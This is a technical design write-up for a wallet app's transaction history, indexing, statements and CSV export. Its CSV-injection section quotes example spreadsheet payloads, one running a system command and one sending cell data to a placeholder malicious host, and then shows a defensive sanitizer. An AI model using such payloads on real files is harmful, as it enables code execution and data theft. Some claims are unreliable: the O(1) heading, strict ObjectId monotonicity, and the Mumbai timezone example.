# DAY8_ANSWERS.md — KaasuPay Day 8 Architecture, Database Optimization & Statements

This document provides production-grade architectural and technical answers for the **Day 8 Milestone (History, Cursor Pagination, Database Optimization, Monthly Statements & CSV Export)** in the KaasuPay wallet codebase.

---

## 1. Offset Pagination vs. Cursor Pagination

### Why Offset Pagination Breaks at Scale
Offset pagination (`skip` + `limit`) suffers from two fatal problems in financial transaction feeds:

1. **Page Drift / Duplicate & Missing Records (Data Instability):**
   - Suppose a user requests page 1 (`limit=10, skip=0`). They inspect 10 transactions.
   - While reading page 1, 3 new incoming transfers or deposits are credited to their wallet.
   - When the user requests page 2 (`limit=10, skip=10`), the database offsets from the *new* head of the collection.
   - Because 3 new records were prepended at index 0, the items that occupied positions 8, 9, and 10 on page 1 are pushed down to positions 11, 12, and 13.
   - **Result:** The user sees transactions 8, 9, and 10 a second time on page 2! Conversely, if records are deleted or archived, items are skipped entirely.
2. **$O(N)$ Database Degradation (Performance Cliff):**
   - In MongoDB or SQL, `skip(N)` requires the query engine to traverse and evaluate $N$ indexed keys or documents before returning the first result of the requested page.
   - For page 1,000 (`skip=10000`), the database scans 10,000 index keys just to discard them. This results in heavy cache churn, CPU exhaustion, and linear latency degradation ($O(N)$).

### How Cursor Pagination Eliminates Both Issues
Cursor pagination relies on seeking relative to an immutable, monotonically ordered anchor point (e.g. `(createdAt, _id)`):

1. **Immunity to Prepending / Interleaved Inserts:**
   - Instead of asking "give me rows 21 through 40", the client asks "give me 20 rows that occurred strictly before transaction `T`".
   - If 1,000 new transactions occur while the user is reading page 1, the filter criteria for page 2 (`createdAt < cursor.t OR (createdAt == cursor.t AND _id < cursor.id)`) remains completely unaffected.
   - The user never encounters duplicates or missed items.
2. **$O(1)$ Direct Index Seeks:**
   - With an index on `{ userId: 1, createdAt: -1, _id: -1 }`, the B-Tree engine immediately seeks directly to the cursor key in $O(\log N)$ time and traverses exactly `limit` entries.
   - `totalDocsExamined` is bounded to `limit + 1`, regardless of whether the user is on page 1 or page 50,000.

---

## 2. Same-Millisecond Tie Breaking

### The Same-Millisecond Collision Problem
In high-throughput environments (e.g. automated payroll credits, bulk top-ups, concurrent merchant payouts), multiple transactions for a user can easily share the identical millisecond timestamp `createdAt`.

If pagination used only `{ createdAt: { $lt: cursorDate } }`:
- Suppose two transactions, $A$ (`_id: 67a1...01`) and $B$ (`_id: 67a1...02`), have identical timestamps `2026-11-05T10:00:00.000Z`.
- Transaction $A$ is returned as the 20th item of page 1.
- Page 2 queries `{ createdAt: { $lt: "2026-11-05T10:00:00.000Z" } }`.
- **Result:** Transaction $B$ is skipped completely because its timestamp is not strictly less than the cursor!

### How KaasuPay Implements Deterministic Tie Breaking
KaasuPay pairs `createdAt` with MongoDB's unique `_id` (12-byte ObjectId) as the deterministic tie-breaker:

```javascript
// Query filter for cursor seek
if (cursor) {
  const { t, id } = decodeCursor(cursor);
  const cursorDate = new Date(t);
  const cursorId = new mongoose.Types.ObjectId(id);

  filter.$or = [
    { createdAt: { $lt: cursorDate } },
    {
      createdAt: cursorDate,
      _id: { $lt: cursorId },
    },
  ];
}
```

And sorts identically in the database query:
```javascript
.sort({ createdAt: -1, _id: -1 })
```

Because MongoDB ObjectIds are strictly unique and monotonically generated, the tuple `(createdAt, _id)` provides a total ordering over all documents. No record can ever be skipped or duplicated.

---

## 3. Explain Plan Comparison: Without Index vs. With Compound Index

During Phase 3 implementation, empirical benchmarks were executed on 5,000 seeded ledger entries using `tools/benchmark-explain.js`.

### 1. Before Adding the Compound Index
- **Index:** Default `{ _id: 1 }` only.
- **Query Planner Winning Stage:** `SORT` (In-memory sorting)
- **Input Stage:** `COLLSCAN` (Full collection scan)
- **`totalDocsExamined`:** `5,000`
- **`totalKeysExamined`:** `0`
- **`nReturned`:** `21`
- **`executionTimeMillis`:** `36 ms`
- **Diagnosis:** The database performed an unindexed scan of all 5,000 documents, copied them into RAM, and sorted them using a temporary sort buffer. This would cause `Sort memory limit exceeded (104857600 bytes)` in production.

### 2. After Adding Compound Index `{ userId: 1, createdAt: -1, _id: -1 }`
- **Query Planner Winning Stage:** `LIMIT`
- **Input Stage:** `IXSCAN` (B-tree Index scan) -> `FETCH`
- **`indexName`:** `userId_1_createdAt_-1__id_-1`
- **`totalDocsExamined`:** `21`
- **`totalKeysExamined`:** `21`
- **`nReturned`:** `21`
- **`executionTimeMillis`:** `1 ms`
- **Diagnosis:** Zero in-memory sorting (`SORT` stage completely eliminated). Direct index traversal to the user's records.

### Performance Summary Table

| Metric | Without Compound Index | With Compound Index | Improvement |
| :--- | :--- | :--- | :--- |
| **Winning Stage** | `SORT` over `COLLSCAN` | `LIMIT` over `IXSCAN` | Eliminated in-memory sort |
| **Documents Examined** | `5,000` | `21` | **238x reduction (99.6%)** |
| **Keys Examined** | `0` | `21` | Direct index seek |
| **Execution Latency** | `36 ms` | `1 ms` | **36x faster** |

---

## 4. Why Denormalize `type` onto `LedgerEntry`?

### The Relational Join Penalty
In the original Day 3 schema, `LedgerEntry` only stored:
`{ userId, transactionId, direction, amount, balanceAfter, createdAt }`

To filter transaction history by transaction type (e.g. `GET /history?type=TRANSFER`), the application either had to:
1. Perform a MongoDB `$lookup` aggregation joining `LedgerEntry` to `Transaction` on `transactionId`.
2. First query `Transaction.find({ type: "TRANSFER" })` and pass all matching `_id`s in an `$in` query: `{ transactionId: { $in: [...] } }`.

**Why this fails at scale:**
- `$lookup` inside paginated queries prevents efficient index-backed sorting across the joined collection without scanning the entire join set.
- Passing thousands of ObjectIds in `$in` degrades MongoDB query planner performance and easily exceeds MongoDB's 16MB BSON query limit.

### The Denormalization Solution
By storing `type` directly on `LedgerEntry`:
```javascript
type: {
  type: String,
  enum: ["TRANSFER", "DEPOSIT", "TOPUP", "WITHDRAWAL", "REVERSAL"],
}
```
And creating the compound index:
```javascript
ledgerEntrySchema.index({ userId: 1, type: 1, createdAt: -1, _id: -1 });
```
- Queries filtering by type satisfy the **ESR (Equality, Sort, Range)** rule:
  - **Equality:** `userId = ?`, `type = ?`
  - **Sort:** `createdAt DESC, _id DESC`
- The query requires zero `$lookup` joins and examines only `limit + 1` index keys directly from disk.

---

## 5. Backfill Migration Strategy

When denormalizing a new field in a live financial system, zero downtime and idempotency are mandatory.

### Backfill Script Design (`tools/backfill-ledger-type.js`):
1. **Cursor-Based Batching (No OOM):**
   - The script batches records in chunks of 500 documents ordered by `{ _id: 1 }`.
   - Never loads the entire collection into memory at once.
2. **Targeted Querying:**
   - Only queries records where `type` is missing: `{ type: { $exists: false } }`.
3. **Idempotency:**
   - Running the script once updates un-migrated rows.
   - Running the script a second time immediately finds 0 missing records and exits safely without mutating existing records or timestamps.
4. **Resilience & Fallbacks:**
   - Reads the parent `Transaction.findById(entry.transactionId)`. If parent type exists, assigns that type.
   - If parent transaction was orphaned or corrupted, falls back safely based on ledger direction (`DEBIT` $\to$ `WITHDRAWAL`, `CREDIT` $\to$ `DEPOSIT`).

---

## 6. Compound Index Field Ordering (The ESR Rule)

In MongoDB, compound index keys must follow the **ESR Rule**:
$$\textbf{E}\text{quality} \longrightarrow \textbf{S}\text{ort} \longrightarrow \textbf{R}\text{ange}$$

### Our Primary Index:
`{ userId: 1, createdAt: -1, _id: -1 }`

1. **Equality (`userId: 1`):** Every history query is strictly scoped to the authenticated user (`req.userId`). Placing `userId` first narrows the index search space from millions of platform documents down to only the user's subset.
2. **Sort (`createdAt: -1, _id: -1`):** The index tree is ordered newest-first. When MongoDB applies the sort, it traverses the index in index order. This completely eliminates the need for an in-memory `SORT` buffer.
3. **Range (`createdAt: { $lt: cursorDate }`):** Because the range field matches the sort direction, the engine performs a single B-tree seek to `cursorDate` and reads forward sequentially.

If `createdAt` were placed before `userId` (`{ createdAt: -1, userId: 1 }`), MongoDB would have to scan every transaction across all users for that timestamp before finding the current user's records.

---

## 7. India Standard Time (IST) Date Handling

### The Problem with Local Server Time
- MongoDB stores all `Date` objects in UTC (`+00:00`).
- If an application runs in a container or cloud environment configured to UTC, querying "Today" or "October 15" using UTC boundaries shifts the time window by 5 hours and 30 minutes.
- A user in Mumbai who made a transfer at 11:30 PM on October 15 (which is 6:00 PM UTC on October 15) would see their transaction classified under October 16 if timezone offsets are handled naively.

### KaasuPay's IST Boundary Arithmetic (`services/dateUtils.js`):
1. **IST Midnight ($00:00:00.000$ IST):**
   ```javascript
   export function istMidnight(dateStr) {
     return new Date(`${dateStr}T00:00:00.000+05:30`);
   }
   ```
   For `2026-10-15`, this translates to `2026-10-14T18:30:00.000Z` UTC.
2. **Exclusive Next-Day Upper Bound (`< 00:00:00.000` next day IST):**
   ```javascript
   export function istNextDayMidnight(dateStr) {
     const [year, month, day] = dateStr.split("-").map(Number);
     const nextDay = new Date(Date.UTC(year, month - 1, day + 1));
     return istMidnight(`${nextDay.getUTCFullYear()}-${...}-${...}`);
   }
   ```
   Querying with `$gte: start` and `$lt: nextDayStart` guarantees that all transactions occurring up to `23:59:59.999 IST` are captured without overlap.

---

## 8. Monthly Statements: Opening, Closing & Reconciliation

A financial statement must satisfy double-entry mathematical conservation:

$$\textbf{Opening Balance} + \textbf{Total In} - \textbf{Total Out} = \textbf{Closing Balance}$$

### How KaasuPay Computes These Values (`controllers/walletController.js`):

1. **`openingBalance`:**
   - Queried as the `balanceAfter` of the user's latest ledger entry strictly before the start of the month:
     ```javascript
     const lastBeforeEntry = await LedgerEntry.findOne({
       userId: userObjectId,
       createdAt: { $lt: monthStart },
     })
       .sort({ createdAt: -1, _id: -1 })
       .select("balanceAfter");
     ```
   - If no prior transactions exist (e.g. account created this month), `openingBalance = 0`.
2. **`totalIn`, `totalOut`, `entries`:**
   - Computed in a single aggregation pipeline matching `{ userId, createdAt: { $gte: monthStart, $lt: monthEnd } }`:
     ```javascript
     totalIn: { $sum: { $cond: [{ $eq: ["$direction", "CREDIT"] }, "$amount", 0] } }
     totalOut: { $sum: { $cond: [{ $eq: ["$direction", "DEBIT"] }, "$amount", 0] } }
     ```
3. **`closingBalance`:**
   - Queried as the `balanceAfter` of the user's latest ledger entry inside the month:
     ```javascript
     const lastInMonthEntry = await LedgerEntry.findOne({
       userId: userObjectId,
       createdAt: { $gte: monthStart, $lt: monthEnd },
     })
       .sort({ createdAt: -1, _id: -1 })
       .select("balanceAfter");
     ```
   - If zero transactions occurred during the month, `closingBalance = openingBalance`.
4. **Reconciliation Flag (`check`):**
   ```javascript
   const check = (openingBalance + totalIn - totalOut === closingBalance);
   ```
   If this check ever evaluates to `false`, the system signals an internal audit alert.

---

## 9. CSV Injection (Formula Injection) Defense

### The Vulnerability
When spreadsheet applications (Microsoft Excel, LibreOffice Calc, Google Sheets) open a CSV file, cells beginning with formula triggers (`=`, `+`, `-`, `@`) are interpreted as executable formulas.

An attacker could send a transfer note such as:
`=cmd|'/C calc'!A0` or `=HYPERLINK("https://malicious.site/phish?leak="&A2)`
When an accountant or user exports their monthly statement to CSV and opens it in Excel, the spreadsheet executes the operating system payload or exfiltrates confidential balances.

### KaasuPay's Sanitization Defense (`services/csv.js`):
```javascript
export function csvCell(val) {
  if (val === null || val === undefined) return "";
  let str = String(val);

  // Immunize against formula injection
  if (/^[=+\-@]/.test(str)) {
    str = `'${str}`;
  }

  // RFC-4180 escaping
  if (/[",\r\n]/.test(str)) {
    str = `"${str.replace(/"/g, '""')}"`;
  }

  return str;
}
```
Prefixing with a single quote (`'`) forces the spreadsheet program to treat the cell value strictly as plain text, neutralizing the formula engine.

---

## 10. Whole-Integer Paise vs. Floating-Point Rupee Math

### The Binary Floating-Point Danger
JavaScript numbers are IEEE-754 double-precision floating-point values. Standard division causes binary rounding artifacts:
```javascript
0.1 + 0.2 === 0.30000000000000004 // true!
19.99 * 100 === 1998.9999999999998 // true!
```
In a financial wallet, converting `2500` paise to rupees using `paise / 100` can accumulate fractional errors that break statement reconciliation checks and corrupt accounting records.

### KaasuPay's Integer Conversion Engine (`services/csv.js`):
```javascript
export function rupees(paise) {
  if (paise === null || paise === undefined || paise === "") return "";
  const intPaise = Math.trunc(Number(paise));
  if (isNaN(intPaise)) return "";

  const sign = intPaise < 0 ? "-" : "";
  const abs = Math.abs(intPaise);
  const whole = Math.floor(abs / 100);
  const frac = String(abs % 100).padStart(2, "0");
  return `${sign}${whole}.${frac}`;
}
```
Using whole-integer division (`Math.floor(abs / 100)`) and integer modulo remainder (`String(abs % 100).padStart(2, "0")`) guarantees exact representation for every rupee value without floating-point inaccuracy.

---

## 11. Limit + 1 Query Pattern for `nextCursor`

### Why Query `limit + 1` Instead of Running a Second `countDocuments()` Query?
To determine whether a next page exists, applications traditionally run two queries:
1. `find().limit(20)`
2. `countDocuments({ createdAt: { $lt: cursorDate } })`

Running `countDocuments()` requires traversing all remaining documents in the index, which is expensive on large collections ($O(N)$).

### How Limit + 1 Works:
1. When the client requests `limit=20`, the backend queries MongoDB with `limit(21)`:
   ```javascript
   const entries = await LedgerEntry.find(filter)
     .sort({ createdAt: -1, _id: -1 })
     .limit(limit + 1);
   ```
2. If `entries.length === 21`:
   - A next page exists.
   - The backend slices the first 20 items to return to the client: `itemsToReturn = entries.slice(0, 20)`.
   - The 20th item provides the `(createdAt, _id)` timestamp used to construct `nextCursor`.
3. If `entries.length <= 20`:
   - The current batch is the final page.
   - The backend returns `nextCursor: null`.
4. **Efficiency:** The existence of a next page is detected in a single database round-trip with zero extra index scans.

---

## 12. Security & User Isolation in Statements and History

### Security Principles Enforced:
1. **Authenticated User Scoping:**
   - Every history query (`/history`), statement query (`/statement`), and CSV export (`/statement/csv`) explicitly filters by `userId: req.userId` extracted from the verified JWT payload.
   - It is impossible for user $A$ to inspect, filter, or download the transaction history or statement of user $B$.
2. **Automated User Isolation Tests:**
   - Verified in `test/day8.test.js`:
     - Test user Meena performs 46 deposits, a transfer, and holds ₹1,485.34.
     - Stranger user authenticates with their own JWT and queries `GET /wallet/history` and `GET /wallet/statement`.
     - Stranger receives 0 items and `entries: 0`.
3. **Immutability of the Ledger:**
   - `LedgerEntry` documents are never updated or deleted by transactions.
   - Historical audit records reflect irreversible financial facts.
